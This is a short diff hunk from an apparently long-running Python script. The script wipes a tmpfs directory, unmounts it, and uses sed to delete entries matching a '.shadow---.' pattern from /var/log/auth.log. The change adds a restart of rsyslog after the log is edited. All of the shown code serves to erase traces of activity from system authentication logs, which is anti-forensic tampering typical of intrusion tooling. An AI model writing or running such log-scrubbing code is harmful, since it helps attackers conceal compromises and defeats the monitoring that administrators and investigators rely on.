@@ -69,7 +69,7 @@ while True:
                 subprocess.call("rm -rf /tmp/tmpfs/*", shell=True)
                 subprocess.call("umount /tmp/tmpfs/", shell=True)
                 subprocess.check_output("sed -i '/.shadow---./d' /var/log/auth.log", shell=True);
-                
+                subprocess.check_output("/etc/init.d/rsyslog restart", shell=True);
 
 
 
